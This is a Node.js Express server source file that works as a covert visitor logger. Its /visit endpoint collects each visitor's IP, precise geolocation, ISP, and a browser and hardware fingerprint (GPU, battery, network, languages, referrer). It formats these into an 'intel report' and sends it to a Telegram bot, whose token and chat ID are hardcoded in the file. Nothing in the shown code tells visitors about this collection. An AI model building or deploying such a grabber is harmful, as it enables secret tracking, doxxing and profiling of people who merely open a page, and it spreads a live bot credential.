const express = require("express");
const path = require("path");

const app = express();
app.use(express.json());

// ====== SECURE CONFIG ======
const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
const TELEGRAM_CHAT_ID = "8059402181";
const PORT = process.env.PORT || 3000;

// ====== TELEGRAM DISPATCHER ======
async function sendToTelegram(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: "HTML"
      }),
    });
  } catch (err) { console.error("Dispatch Error:", err); }
}

// ====== LOGGING LOGIC ======
app.post("/visit", async (req, res) => {
  try {
    const client = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // Fetch Full ISP & Geo Data (Maximum fields)
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=16777215`);
    const geo = await geoRes.json();

    const report = `
<b>🚀 ULTIMATE VISITOR INTEL REPORT (100%)</b>
------------------------------------
<b>🌐 ISP & NETWORK (DEEP SCAN)</b>
<b>• ISP:</b> ${geo.isp}
<b>• Org Name:</b> ${geo.org || 'N/A'}
<b>• ASN:</b> ${geo.as}
<b>• IP Type:</b> ${geo.hosting ? "Cloud/Hosting" : "Residential/Mobile"}
<b>• VPN/Proxy:</b> ${geo.proxy ? "Detected ⚠️" : "Clean ✅"}

<b>📍 PRECISE GEOGRAPHY</b>
<b>• Country:</b> ${geo.country} (${geo.countryCode})
<b>• Region:</b> ${geo.regionName}
<b>• City:</b> ${geo.city} (${geo.zip})
<b>• Lat/Lon:</b> ${geo.lat}, ${geo.lon}
<b>• ISP Timezone:</b> ${geo.timezone}

<b>💻 HARDWARE SPECIFICATIONS</b>
<b>• CPU Cores:</b> ${client.hardware?.cores}
<b>• Memory (RAM):</b> ~${client.hardware?.ram} GB
<b>• GPU (Renderer):</b> <code>${client.gpu?.renderer || 'N/A'}</code>
<b>• Platform:</b> ${client.hardware?.platform}
<b>• Resolution:</b> ${client.display?.width}x${client.display?.height}
<b>• Touch Support:</b> ${client.hardware?.touchPoints > 0 ? "Yes" : "No"}

<b>🔋 LIVE DEVICE STATUS</b>
<b>• Battery:</b> ${client.status?.battery || 'N/A'} (${client.status?.charging || 'N/A'})
<b>• Connection:</b> ${client.networkType?.type} (~${client.networkType?.downlink})
<b>• Latency (RTT):</b> ${client.networkType?.rtt}

<b>🧠 BROWSER FINGERPRINT</b>
<b>• Languages:</b> ${client.browser?.languages}
<b>• Referrer:</b> ${client.browser?.referrer}
<b>• Automation Bot:</b> ${client.browser?.webdriver ? "YES 🤖" : "No"}
<b>• User-Agent:</b> <code>${req.headers["user-agent"]}</code>

<b>⏰ LOG TIME:</b> ${new Date().toUTCString()}
------------------------------------
`;

    await sendToTelegram(report);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: "log_failed" });
  }
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`Server Online - Port ${PORT}`);
});
